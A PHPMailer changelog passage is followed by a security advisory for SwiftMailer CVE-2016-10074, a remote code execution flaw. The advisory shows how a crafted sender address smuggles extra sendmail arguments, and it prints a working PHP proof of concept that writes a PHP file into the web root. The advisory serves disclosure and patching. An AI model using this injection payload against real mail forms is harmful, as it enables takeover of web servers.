* Improve pointers to docs and support in README
* Add example file upload script
* Refactor and major cleanup of EasyPeasyICS, now a lot more usable
* Make set() method simpler and more reliable
* Add Malay translation (Thanks to @nawawi)
* Add Bulgarian translation (Thanks to @mialy)
* Add Armenian translation (Thanks to Hrayr Grigoryan)
* Add Slovenian translation (Thanks to Klemen Tušar)
* More efficient word wrapping
* Add support for S/MIME signing with additional CA certificate (thanks to @IgitBuh)
* Fix incorrect MIME structure when using S/MIME signing and isMail() (#372)
* Improved checks and error messages for missing extensions
* Store and report SMTP errors more consistently
* Add MIME multipart preamble for better Outlook compatibility
* Enable TLS encryption automatically if the server offers it
* Provide detailed errors when individual recipients fail
* Report more errors when connecting
* Add extras classes to composer classmap
* Expose stream\_context\_create options via new SMTPOptions property
* Automatic encoding switch to quoted-printable if message lines are too long
* Add Korean translation (Thanks to @ChalkPE)
* Provide a pointer to troubleshooting docs on SMTP connection failure

## Version 5.2.9 (Sept 25th 2014)

* **Important: The autoloader is no longer autoloaded by the PHPMailer class**
* Update html2text from <https://github.com/mtibben/html2text>
* Improve Arabic translations (Thanks to @tarekdj)
* Consistent handling of connection variables in SMTP and POP3
* PHPDoc cleanup
* Update composer to use PHPUnit 4.1
* Pass consistent params to callbacks
* More consistent handling of error states and debug output
* Use property defaults, remove constructors
* Remove unreachable code
* Use older regex validation pattern for troublesome PCRE library versions
* Improve PCRE detection in older PHP versions
* Handle debug output consistently, and always in UTF-8
* Allow user-defined debug output method via a callable
* msgHTML now converts data URIs to embedded images
* SMTP::getLastReply() will now always be populated
* Improved example code in README
* Ensure long filenames in Content-Disposition are encoded correctly
* Simplify SMTP debug output mechanism, clarify levels with constants
* Add SMTP connection check example
* Simplify examples, don't use mysql\* functions

## Version 5.2.8 (May 14th 2014)

* Increase timeout to match RFC2821 section 4.5.3.2 and thus not fail greetdelays, fixes #104
* Add timestamps to default debug output
* Add connection events and new level 3 to debug output options
* Chinese language update (Thanks to @binaryoung)
* Allow custom Mailer types (Thanks to @michield)
* Cope with spaces around SMTP host specs
* Fix processing of multiple hosts in connect string
* Added Galician translation (Thanks to @donatorouco)
* Autoloader now prepends
* Docs updates
* Add Latvian translation (Thanks to @eddsstudio)
* Add Belarusian translation (Thanks to @amaksymiuk)
* Make autoloader work better on older PHP versions
* Avoid double-encoding if mbstring is overloading mail()
* Add Portuguese translation (Thanks to @Jonadabe)
* Make quoted-printable encoder respect line ending setting
* Improve Chinese translation (Thanks to @PeterDaveHello)
* Add Georgian translation (Thanks to @akalongman)
* Add Greek translation (Thanks to @lenasterg)
* Fix serverHostname on PHP < 5.3
* Improve performance of SMTP class
* Implement automatic 7bit downgrade
* Add Vietnamese translation (Thanks to @vinades)
* Improve example images, switch to PNG
* Add Croatian translation (Thanks to @hrvoj3e)
* Remove setting the Return-Path and deprecate the Return-path property - it's just wrong!
* Fix language file loading if CWD has changed (@stephandesouza)
* Add HTML5 email validation pattern
* Improve Turkish translations (Thanks to @yasinaydin)
* Improve Romanian translations (Thanks to @aflorea)
* Check php.ini for path to sendmail/qmail before using default
* Improve Farsi translation (Thanks to @MHM5000)
* Don't use quoted-printable encoding for multipart types
* Add Serbian translation (Thanks to ajevremovic at gmail.com)
* Remove useless PHP5 check
* Use SVG for build status badges
* Store MessageDate on creation
* Better default behaviour for validateAddress

## Version 5.2.7 (September 12th 2013)

* Add Ukrainian translation from @Krezalis
* Support for do\_verp
* Fix bug in CRAM-MD5 AUTH
* Propagate Debugoutput option to SMTP class (@Reblutus)
* Determine MIME type of attachments automatically
* Add cross-platform, multibyte-safe pathinfo replacement (with tests) and use it
* Add a new 'html' Debugoutput type
* Clean up SMTP debug output, remove embedded HTML
* Some small changes in header formatting to improve IETF msglint test results
* Update test\_script to use some recently changed features, rename to code\_generator
* Generated code actually works!
* Update SyntaxHighlighter
* Major overhaul and cleanup of example code
* New PHPMailer graphic
* msgHTML now uses RFC2392-compliant content ids
* Add line break normalization function and use it in msgHTML
* Don't set unnecessary reply-to addresses
* Make fakesendmail.sh a bit cleaner and safer
* Set a content-transfer-encoding on multiparts (fixes msglint error)
* Fix cid generation in msgHTML (Thanks to @digitalthought)
* Fix handling of multiple SMTP servers (Thanks to @NanoCaiordo)
* SMTP->connect() now supports stream context options (Thanks to @stanislavdavid)
* Add support for iCal event alternatives (Thanks to @reblutus)
* Update to Polish language file (Thanks to Krzysztof Kowalewski)
* Update to Norwegian language file (Thanks to @datagutten)
* Update to Hungarian language file (Thanks to @dominicus-75)
* Add Persian/Farsi translation from @jaii
* Make SMTPDebug property type match type in SMTP class
* Add unit tests for DKIM
* Major refactor of SMTP class
* Reformat to PSR-2 coding standard
* Introduce autoloader
* Allow overriding of SMTP class
* Overhaul of PHPDocs
* Fix broken Q-encoding
* Czech language update (Thanks to @nemelu)
* Removal of excess blank lines in messages
* Added fake POP server and unit tests for POP-before-SMTP

## Version 5.2.6 (April 11th 2013)

* Reflect move to PHPMailer GitHub organisation at <https://github.com/PHPMailer/PHPMailer>
* Fix unbumped version numbers
* Update packagist.org with new location
* Clean up Changelog

## Version 5.2.5 (April 6th 2013)

* First official release after move from Google Code
* Fixes for qmail when sending via mail()
* Merge in changes from Google code 5.2.4 release
* Minor coding standards cleanup in SMTP class
* Improved unit tests, now tests S/MIME signing
* Travis-CI support on GitHub, runs tests with fake SMTP server

## Version 5.2.4 (February 19, 2013)

* Fix tag and version bug.
* un-deprecate isSMTP(), isMail(), IsSendmail() and isQmail().
* Numerous translation updates

## Version 5.2.3 (February 8, 2013)

* Fix issue with older PCREs and ValidateAddress() (Bugz: 124)
* Add CRAM-MD5 authentication, thanks to Elijah madden, <https://github.com/okonomiyaki3000>
* Replacement of obsolete Quoted-Printable encoder with a much better implementation
* Composer package definition
* New language added: Hebrew

## Version 5.2.2 (December 3, 2012)

* Some fixes and syncs from <https://github.com/Synchro/PHPMailer>
* Add Slovak translation, thanks to Michal Tinka

## Version 5.2.2-rc2 (November 6, 2012)

* Fix SMTP server rotation (Bugz: 118)
* Allow override of autogen'ed 'Date' header (for Drupal's
  og\_mailinglist module)
* No whitespace after '-f' option (Bugz: 116)
* Work around potential warning (Bugz: 114)

## Version 5.2.2-rc1 (September 28, 2012)

* Header encoding works with long lines (Bugz: 93)
* Turkish language update (Bugz: 94)
* undefined $pattern in EncodeQ bug squashed (Bugz: 98)
* use of mail() in safe\_mode now works (Bugz: 96)
* ValidateAddress() now 'public static' so people can override the
  default and use their own validation scheme.
* ValidateAddress() no longer uses broken FILTER\_VALIDATE\_EMAIL
* Added in AUTH PLAIN SMTP authentication

## Version 5.2.2-beta2 (August 17, 2012)

* Fixed Postfix VERP support (Bugz: 92)
* Allow action\_function callbacks to pass/use
  the From address (passed as final param)
* Prevent inf look for get\_lines() (Bugz: 77)
* New public var ($UseSendmailOptions). Only pass sendmail()
  options iff we really are using sendmail or something sendmail
  compatible. (Bugz: 75)
* default setting for LE returned to "\n" due to popular demand.

## Version 5.2.2-beta1 (July 13, 2012)

* Expose PreSend() and PostSend() as public methods to allow
  for more control if serializing message sending.
* GetSentMIMEMessage() only constructs the message copy when
  needed. Save memory.
* Only pass params to mail() if the underlying MTA is
  "sendmail" (as defined as "having the string sendmail
  in its pathname") [#69]
* Attachments now work with Amazon SES and others [Bugz#70]
* Debug output now sent to stdout (via echo) or error\_log [Bugz#5]
* New var: Debugoutput (for above) [Bugz#5]
* SMTP reads now Timeout aware (new var: Timeout=15) [Bugz#71]
* SMTP reads now can have a Timelimit associated with them
  (new var: Timelimit=30)[Bugz#71]
* Fix quoting issue associated with charsets
* default setting for LE is now RFC compliant: "\r\n"
* Return-Path can now be user defined (new var: ReturnPath)
  (the default is "" which implies no change from previous
  behavior, which was to use either From or Sender) [Bugz#46]
* X-Mailer header can now be disabled (by setting to a
  whitespace string, eg " ") [Bugz#66]
* Bugz closed: #68, #60, #42, #43, #59, #55, #66, #48, #49,
  #52, #31, #41, #5. #70, #69

## Version 5.2.1 (January 16, 2012)

* Closed several bugs #5
* Performance improvements
* MsgHTML() now returns the message as required.
* New method: GetSentMIMEMessage() (returns full copy of sent message)

## Version 5.2 (July 19, 2011)

* protected MIME body and header
* better DKIM DNS Resource Record support
* better aly handling
* htmlfilter class added to extras
* moved to Apache Extras

## Version 5.1 (October 20, 2009)

* fixed filename issue with AddStringAttachment (thanks to Tony)
* fixed "SingleTo" property, now works with Senmail, Qmail, and SMTP in
  addition to PHP mail()
* added DKIM digital signing functionality, new properties:
  + DKIM\_domain (sets the domain name)
  + DKIM\_private (holds DKIM private key)
  + DKIM\_passphrase (holds your DKIM passphrase)
  + DKIM\_selector (holds the DKIM "selector")
  + DKIM\_identity (holds the identifying email address)
* added callback function support
  + callback function parameters include:
    result, to, cc, bcc, subject and body
  + see the test/test\_callback.php file for usage.
* added "auto" identity functionality
  + can automatically add:
    - Return-path (if Sender not set)
    - Reply-To (if ReplyTo not set)
  + can be disabled:
    - $mail->SetFrom('yourname@yourdomain.com','First Last',false);
    - or by adding the $mail->Sender and/or $mail->ReplyTo properties

Note: "auto" identity added to help with emails ending up in spam or junk boxes because of missing headers

## Version 5.0.2 (May 24, 2009)

* Fix for missing attachments when inline graphics are present
* Fix for missing Cc in header when using SMTP (mail was sent,
  but not displayed in header -- Cc receiver only saw email To:
  line and no Cc line, but did get the email (To receiver
  saw same)

## Version 5.0.1 (April 05, 2009)

* Temporary fix for missing attachments

## Version 5.0.0 (April 02, 2009)

With the release of this version, we are initiating a new version numbering
system to differentiate from the PHP4 version of PHPMailer.
Most notable in this release is fully object oriented code.

### class.smtp.php:

* Refactored class.smtp.php to support new exception handling
* code size reduced from 29.2 Kb to 25.6 Kb
* Removed unnecessary functions from class.smtp.php:
  + public function Expand($name) {
  + public function Help($keyword="") {
  + public function Noop() {
  + public function Send($from) {
  + public function SendOrMail($from) {
  + public function Verify($name) {

### class.phpmailer.php:

* Refactored class.phpmailer.php with new exception handling
* Changed processing functionality of Sendmail and Qmail so they cannot be
  inadvertently used
* removed getFile() function, just became a simple wrapper for
  file\_get\_contents()
* added check for PHP version (will gracefully exit if not at least PHP 5.0)
* enhanced code to check if an attachment source is the same as an embedded or
  inline graphic source to eliminate duplicate attachments

### New /test\_script

We have written a test script you can use to test the script as part of your
installation. Once you press submit, the test script will send a multi-mime
email with either the message you type in or an HTML email with an inline
graphic. Two attachments are included in the email (one of the attachments
is also the inline graphic so you can see that only one copy of the graphic
is sent in the email). The test script will also display the functional
script that you can copy/paste to your editor to duplicate the functionality.

### New examples

All new examples in both basic and advanced modes. Advanced examples show
Exception handling.

### PHPDocumentator (phpdocs) documentation for PHPMailer version 5.0.0

All new documentation

## Version 2.3 (November 06, 2008)

* added Arabic language (many thanks to Bahjat Al Mostafa)
* removed English language from language files and made it a default within
  class.phpmailer.php - if no language is found, it will default to use
  the english language translation
* fixed public/private declarations
* corrected line 1728, $basedir to $directory
* added $sign\_cert\_file to avoid improper duplicate use of $sign\_key\_file
* corrected $this->Hello on line 612 to $this->Helo
* changed default of $LE to "\r\n" to comply with RFC 2822. Can be set by the user
  if default is not acceptable
* removed trim() from return results in EncodeQP
* /test and three files it contained are removed from version 2.3
* fixed phpunit.php for compliance with PHP5
* changed $this->AltBody = $textMsg; to $this->AltBody = html\_entity\_decode($textMsg);
* We have removed the /phpdoc from the downloads. All documentation is now on
  the <http://phpmailer.codeworxtech.com> website.

## Version 2.2.1 (July 19, 2008)

* fixed line 1092 in class.smtp.php (my apologies, error on my part)

## Version 2.2 (July 15, 2008)

* Fixed redirect issue (display of UTF-8 in thank you redirect)
* fixed error in getResponse function declaration (class.pop3.php)
* PHPMailer now PHP6 compliant
* fixed line 1092 in class.smtp.php (endless loop from missing = sign)

## Version 2.1 (Wed, June 04 2008)

NOTE: WE HAVE A NEW LANGUAGE VARIABLE FOR DIGITALLY SIGNED S/MIME EMAILS. IF YOU CAN HELP WITH LANGUAGES OTHER THAN ENGLISH AND SPANISH, IT WOULD BE APPRECIATED.

* added S/MIME functionality (ability to digitally sign emails)
  BIG THANKS TO "sergiocambra" for posting this patch back in November 2007.
  The "Signed Emails" functionality adds the Sign method to pass the private key
  filename and the password to read it, and then email will be sent with
  content-type multipart/signed and with the digital signature attached.
* fully compatible with E\_STRICT error level
  + Please note:
    In about half the test environments this development version was subjected
    to, an error was thrown for the date() functions used (line 1565 and 1569).
    This is NOT a PHPMailer error, it is the result of an incorrectly configured
    PHP5 installation. The fix is to modify your 'php.ini' file and include the
    date.timezone = Etc/UTC (or your own zone)
    directive, to your own server timezone
  + If you do get this error, and are unable to access your php.ini file:
    In your PHP script, add
    `date_default_timezone_set('Etc/UTC');`
  + do not try to use
    `$myVar = date_default_timezone_get();`
    as a test, it will throw an error.
* added ability to define path (mainly for embedded images)
  function `MsgHTML($message,$basedir='')` ... where:
  `$basedir` is the fully qualified path
* fixed `MsgHTML()` function:
  + Embedded Images where images are specified by `<protocol>://` will not be altered or embedded
* fixed the return value of SMTP exit code ( pclose )
* addressed issue of multibyte characters in subject line and truncating
* added ability to have user specified Message ID
  (default is still that PHPMailer create a unique Message ID)
* corrected unidentified message type to 'application/octet-stream'
* fixed chunk\_split() multibyte issue (thanks to Colin Brown, et al).
* added check for added attachments
* enhanced conversion of HTML to text in MsgHTML (thanks to "brunny")

## Version 2.1.0beta2 (Sun, Dec 02 2007)

* implemented updated EncodeQP (thanks to coolbru, aka Marcus Bointon)
* finished all testing, all known bugs corrected, enhancements tested

Note: will NOT work with PHP4.

Please note, this is BETA software **DO NOT USE THIS IN PRODUCTION OR LIVE PROJECTS; INTENDED STRICTLY FOR TESTING**

## Version 2.1.0beta1

Please note, this is BETA software
\*\* DO NOT USE THIS IN PRODUCTION OR LIVE PROJECTS
INTENDED STRICTLY FOR TESTING

## Version 2.0.0 rc2 (Fri, Nov 16 2007), interim release

* implements new property to control VERP in class.smtp.php
  example (requires instantiating class.smtp.php):
  $mail->do\_verp = true;
* POP-before-SMTP functionality included, thanks to Richard Davey
  (see class.pop3.php & pop3\_before\_smtp\_test.php for examples)
* included example showing how to use PHPMailer with GMAIL
* fixed the missing Cc in SendMail() and Mail()

## Version 2.0.0 rc1 (Thu, Nov 08 2007), interim release

* dramatically simplified using inline graphics ... it's fully automated and requires no user input
* added automatic document type detection for attachments and pictures
* added MsgHTML() function to replace Body tag for HTML emails
* fixed the SendMail security issues (input validation vulnerability)
* enhanced the AddAddresses functionality so that the "Name" portion is used in the email address
* removed the need to use the AltBody method (set from the HTML, or default text used)
* set the PHP Mail() function as the default (still support SendMail, SMTP Mail)
* removed the need to set the IsHTML property (set automatically)
* added Estonian language file by Indrek Päri
* added header injection patch
* added "set" method to permit users to create their own pseudo-properties like 'X-Headers', etc.
* fixed warning message in SMTP get\_lines method
* added TLS/SSL SMTP support.
* PHPMailer has been tested with PHP4 (4.4.7) and PHP5 (5.2.7)
* Works with PHP installed as a module or as CGI-PHP
  NOTE: will NOT work with PHP5 in E\_STRICT error mode

## Version 1.73 (Sun, Jun 10 2005)

* Fixed denial of service bug: <http://www.cybsec.com/vuln/PHPMailer-DOS.pdf>
* Now has a total of 20 translations
* Fixed alt attachments bug: <https://sourceforge.net/p/phpmailer/bugs/120/>

## Version 1.72 (Wed, May 25 2004)

* Added Dutch, Swedish, Czech, Norwegian, and Turkish translations.
* Received: Removed this method because spam filter programs like
  SpamAssassin reject this header.
* Fixed error count bug.
* SetLanguage default is now "language/".
* Fixed magic\_quotes\_runtime bug.

## Version 1.71 (Tue, Jul 28 2003)

* Made several speed enhancements
* Added German and Italian translation files
* Fixed HELO/AUTH bugs on keep-alive connects
* Now provides an error message if language file does not load
* Fixed attachment EOL bug
* Updated some unclear documentation
* Added additional tests and improved others

## Version 1.70 (Mon, Jun 20 2003)

* Added SMTP keep-alive support
* Added IsError method for error detection
* Added error message translation support (SetLanguage)
* Refactored many methods to increase library performance
* Hello now sends the newer EHLO message before HELO as per RFC 2821
* Removed the boundary class and replaced it with GetBoundary
* Removed queue support methods
* New $Hostname variable
* New Message-ID header
* Received header reformat
* Helo variable default changed to $Hostname
* Removed extra spaces in Content-Type definition (#667182)
* Return-Path should be set to Sender when set
* Adds Q or B encoding to headers when necessary
* quoted-encoding should now encode NULs \000
* Fixed encoding of body/AltBody (#553370)
* Adds "To: undisclosed-recipients:;" when all recipients are hidden (BCC)
* Multiple bug fixes

## Version 1.65 (Fri, Aug 09 2002)

* Fixed non-visible attachment bug (#585097) for Outlook
* SMTP connections are now closed after each transaction
* Fixed SMTP::Expand return value
* Converted SMTP class documentation to phpDocumentor format

## Version 1.62 (Wed, Jun 26 2002)

* Fixed multi-attach bug
* Set proper word wrapping
* Reduced memory use with attachments
* Added more debugging
* Changed documentation to phpDocumentor format

## Version 1.60 (Sat, Mar 30 2002)

* Sendmail pipe and address patch (Christian Holtje)
* Added embedded image and read confirmation support (A. Ognio)
* Added unit tests
* Added SMTP timeout support (\*nix only)
* Added possibly temporary PluginDir variable for SMTP class
* Added LE message line ending variable
* Refactored boundary and attachment code
* Eliminated SMTP class warnings
* Added SendToQueue method for future queuing support

## Version 1.54 (Wed, Dec 19 2001)

* Add some queuing support code
* Fixed a pesky multi/alt bug
* Messages are no longer forced to have "To" addresses

## Version 1.50 (Thu, Nov 08 2001)

* Fix extra lines when not using SMTP mailer
* Set WordWrap variable to int with a zero default

## Version 1.47 (Tue, Oct 16 2001)

* Fixed Received header code format
* Fixed AltBody order error
* Fixed alternate port warning

## Version 1.45 (Tue, Sep 25 2001)

* Added enhanced SMTP debug support
* Added support for multiple ports on SMTP
* Added Received header for tracing
* Fixed AddStringAttachment encoding
* Fixed possible header name quote bug
* Fixed wordwrap() trim bug
* Couple other small bug fixes

## Version 1.41 (Wed, Aug 22 2001)

* Fixed AltBody bug w/o attachments
* Fixed rfc\_date() for certain mail servers

## Version 1.40 (Sun, Aug 12 2001)

* Added multipart/alternative support (AltBody)
* Documentation update
* Fixed bug in Mercury MTA

## Version 1.29 (Fri, Aug 03 2001)

* Added AddStringAttachment() method
* Added SMTP authentication support

## Version 1.28 (Mon, Jul 30 2001)

* Fixed a typo in SMTP class
* Fixed header issue with Imail (win32) SMTP server
* Made fopen() calls for attachments use "rb" to fix win32 error

## Version 1.25 (Mon, Jul 02 2001)

* Added RFC 822 date fix (Patrice)
* Added improved error handling by adding a $ErrorInfo variable
* Removed MailerDebug variable (obsolete with new error handler)

## Version 1.20 (Mon, Jun 25 2001)

* Added quoted-printable encoding (Patrice)
* Set Version as public and removed PrintVersion()
* Changed phpdoc to only display public variables and methods

## Version 1.19 (Thu, Jun 21 2001)

* Fixed MS Mail header bug
* Added fix for Bcc problem with mail(). *Does not work on Win32*
  (See PHP bug report: <https://bugs.php.net/bug.php?id=11616>
* mail() no longer passes a fifth parameter when not needed

## Version 1.15 (Fri, Jun 15 2001)

Note: these changes contributed by Patrice Fournier

* Changed all remaining \n to \r\n
* Bcc: header no longer written to message except
  when sent directly to sendmail
* Added a small message to non-MIME compliant mail reader
* Added Sender variable to change the Sender email
  used in -f for sendmail/mail and in 'MAIL FROM' for smtp mode
* Changed boundary setting to a place it will be set only once
* Removed transfer encoding for whole message when using multipart
* Message body now uses Encoding in multipart messages
* Can set encoding and type to attachments 7bit, 8bit
  and binary attachment are sent as is, base64 are encoded
* Can set Encoding to base64 to send 8 bits body
  through 7 bits servers

## Version 1.10 (Tue, Jun 12 2001)

* Fixed win32 mail header bug (printed out headers in message body)

## Version 1.09 (Fri, Jun 08 2001)

* Changed date header to work with Netscape mail programs
* Altered phpdoc documentation

## Version 1.08 (Tue, Jun 05 2001)

* Added enhanced error-checking
* Added phpdoc documentation to source

## Version 1.06 (Fri, Jun 01 2001)

* Added optional name for file attachments

## Version 1.05 (Tue, May 29 2001)

* Code cleanup
* Eliminated sendmail header warning message
* Fixed possible SMTP error

## Version 1.03 (Thu, May 24 2001)

* Fixed problem where qmail sends out duplicate messages

## Version 1.02 (Wed, May 23 2001)

* Added multiple recipient and attachment Clear\* methods
* Added Sendmail public variable
* Fixed problem with loading SMTP library multiple times

## Version 0.98 (Tue, May 22 2001)

* Fixed problem with redundant mail hosts sending out multiple messages
* Added additional error handler code
* Added AddCustomHeader() function
* Added support for Microsoft mail client headers (affects priority)
* Fixed small bug with Mailer variable
* Added PrintVersion() function

## Version 0.92 (Tue, May 15 2001)

* Changed file names to class.phpmailer.php and class.smtp.php to match
  current PHP class trend.
* Fixed problem where body not being printed when a message is attached
* Several small bug fixes

## Version 0.90 (Tue, April 17 2001)

* Initial public release

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from legalhackers.com_c8ce843e_20250126_062510.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10074
- Release date:  30.12.2016
- Last revision: 29.12.2016
- Revision 3.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

II. BACKGROUND
-------------------------

"Swift Mailer is a component-based library for sending e-mails from PHP applications."

"Swift Mailer began back in 2005 as a one-class project for sending mail over SMTP.
It has since grown into the flexible component-based library that is in development today."

SwiftMailer library is used by major PHP projects including some of the
most popular PHP programming frameworks such as Yii2, Laravel, Symfony.

<https://github.com/swiftmailer/swiftmailer/blob/5.x/doc/introduction.rst>
<https://github.com/swiftmailer/swiftmailer/blob/5.x/doc/overview.rst>

Symfony / Yii / Laravel frameworks:

<http://symfony.com/doc/current/email.html>

<https://github.com/yiisoft/yii2-swiftmailer>

<https://laravel.com/docs/5.1/mail>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in SwiftMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the SwiftMailer class.

Update (29.12): Vendor has released the patch in version 5.4.5.

Note: This advisory is limited.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

SwiftMailer class uses PHP mail() function as its default transport.

SwiftMailer suffers from the same vulnerability as the one disclosed in
PHPMailer in the advisory at:

<http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

The following Sender address:

"Attacker -Param2 -Param3"@test.com

would cause SwiftMailer/mail() function to execute /usr/bin/sendmail with the
following list of arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker -Param2 -Param3@test.com]

which would not work for the attacker (Param2 and Param3 are passed within
the same argument of argv[3] )

Attackers can however break out of parameter no.3 with some extra escaping.

For example, by injecting an extra sequence of \" after the first argument,
the following Sender email:

"Attacker \" -Param2 -Param3"@test.com

when passed to SwiftMailer (and eventually to mail()) function would cause
sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

<?php

/*

SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

Discovered/Coded by:

Dawid Golunski
<https://legalhackers.com>

Full Advisory URL:
<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

Video PoC
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

Follow the feed for updates:

<https://twitter.com/dawid_golunski>

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fattacker\]
Arg no. 4 == [-oQ/tmp/]
Arg no. 5 == [-X/var/www/cache/phpcode.php]
Arg no. 6 == ["@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.

The resulting file will contain the payload passed in the body of the msg:

09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<

See the full advisory URL for the exploit details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form with sender/body fields

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
$msg_body = '<?php phpinfo(); ?>';

// ------------------

// mail() param injection via the vulnerability in SwiftMailer

require_once 'lib/swift_required.php';
// Mail transport
$transport = Swift_MailTransport::newInstance();
// Create the Mailer using your created Transport
$mailer = Swift_Mailer::newInstance($transport);

// Create a message
$message = Swift_Message::newInstance('Swift PoC exploit')
  ->setFrom(array($email_from => 'PoC Exploit Payload'))
  ->setTo(array('receiver@domain.org', 'other@domain.org' => 'A name'))
  ->setBody($msg_body);
// Send the message with PoC payload in 'from' field
$result = $mailer->send($message);

~~~~~~~~~~~

More advanced exploit targetting a contact form can be found at:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Video PoC:
~~~~~~~~~~~~~

<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

VI. BUSINESS IMPACT
-------------------------

A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.

VII. SYSTEMS AFFECTED
-------------------------

All versions of SwiftMailer including the latest of 5.4.5-DEV are affected.

Update (29.12): Vendor has released the patch in version 5.4.5.

VIII. SOLUTION / VENDOR RESPONSE
-------------------------

The vulnerability was responsibly disclosed to SwiftMailer vendor.
The first contact attempts started on the 2nd of December.
Unfortunatelly the vendor has not fixed the SwiftMailer library to date and
the library remains vulnerable in its latest version (5.4.5-dev).
Because of this, users of SwiftMailer (which includes various frameworks that make
use of the library) remain at risk.

The vendor was advised by the researcher of the upcoming exploit for another
library (PHPMailer) which when published by the vendor/researcher, would make
it possible for malicious users to "connect the dots" and use the same vectors/payloads
to attack SwiftMailer users as they are almost identical.

The last attempt of contact (resending the tested PoC exploit) was made on Dec 26th
to which the vendor have not replied and little action seems to have been taken.

As after the publication of PHPMailer exploit and patches other users on the Internet
did start to see the similarities and file public vulnerability reports, there is no
more point in keeping this advisory private. Keeping it private would only give
more advantage to potential attackers.

CVE MITRE assigned the following ID to this vulnerability:

CVE-2016-10074

Update (29.12): Vendor has released the patch in version 5.4.5.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

This (CVE-2016-10074) advisory:
<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

Video PoC:
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>
<https://www.youtube.com/watch?v=xyYMYvT2bx8>

Exploit code:
Simple PoC shown above is available here:
<https://legalhackers.com/exploits/CVE-2016-10074/SwiftMailer_PoC_RCE_Exploit.txt>

Combined exploit code for multiple targets:
<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Other exploits with other attack vectors will be disclosed at a later date to
allow more time for patching.

The previously undisclosed techniques and exploitation vectors will be described in a security
white-paper at:
<https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html>

CVE-2016-10074
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10074>

SwiftMailer github

<https://github.com/swiftmailer/swiftmailer>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>

Thanks to SecuriTeam for help with the disclosure.

XI. REVISION HISTORY
-------------------------

30.12.2016 - Updated exploit code

29.12.2016 - Update regarding the patch

28.12.2016 - Limited advisory released

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
